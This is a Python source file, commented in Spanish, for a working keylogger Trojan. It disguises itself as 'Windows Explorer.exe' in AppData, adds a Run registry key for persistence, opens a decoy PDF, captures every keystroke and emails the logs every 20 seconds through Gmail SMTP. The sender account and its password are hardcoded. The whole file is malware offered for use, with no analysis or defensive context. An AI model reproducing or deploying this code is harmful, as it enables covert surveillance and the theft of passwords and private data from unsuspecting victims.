import threading
import smtplib
import sys
import shutil
import os
import subprocess
import pynput.keyboard

class Keylogger:
	def __init__(self,time_interval,email,password):
		self.log="Keylogger started"
		self.interval=time_interval
		self.email=email
		self.password=password
		self.become_persistent()
	def become_persistent(self):# Hace que el malware sea persistente. Inicia el malware al momento que la victima enciende su equipo
		evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe" # Obteniendo ruta alterna al malware
		if not os.path.exists(evil_file_location):
			shutil.copyfile(sys.executable,evil_file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location +'"',shell=True)
	def append_to_log(self,string):
		self.log=self.log+string
	def process_key_press(self,key):
		try:
			current_key=str(key.char)
		except AttributeError:
			if key==key.space:
				current_key= " "
			else:
				current_key= " "+str(key)+" "
		self.append_to_log(current_key)
	def report(self,):
		self.send_mail(self.email,self.password,"\n\n" + self.log)
		self.log=""
		timer=threading.Timer(self.interval,self.report)
		timer.start()

	def send_mail(self,email,password,message):
		server=smtplib.SMTP("smtp.gmail.com",587)
		server.starttls()
		server.login(email,password)
		server.sendmail(email,email,message)
		server.quit()
	def start(self):
		keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_press)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()

# Abrir pdf
file_name=sys._MEIPASS + "/info.pdf"
subprocess.Popen(file_name,shell=True)

# Ejecutar keylogger
my_keylogger=Keylogger(20,"josemesasillaarmario@gmail.com","239199814Qaz")
my_keylogger.start()	

